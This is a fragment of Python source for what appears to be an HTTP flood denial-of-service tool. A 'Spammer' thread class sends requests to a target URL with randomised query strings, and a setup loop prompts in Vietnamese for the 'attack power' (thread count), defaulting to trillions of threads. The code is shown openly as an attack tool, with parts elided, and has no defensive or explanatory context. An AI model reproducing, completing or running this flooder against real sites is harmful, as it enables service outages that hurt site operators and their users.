...
class Spammer(threading.Thread):
    def __init__(self, url, number, lista):
        ...
        self.url = url + "?" + str(random.randint(0,9999999999999999999999999999)) + "=" + str(random.randint(0,9999999999999999999999999999))
        self.num = number
...
class MainLoop():
    ...
    def setup(self):
        ...
        while True:                
            try:
                num_threads = int(input('> Nhập sức mạnh tấn công bình thường [900] Max 9000000000000: '))
            except:
                num_threads = 9000000000000
            break
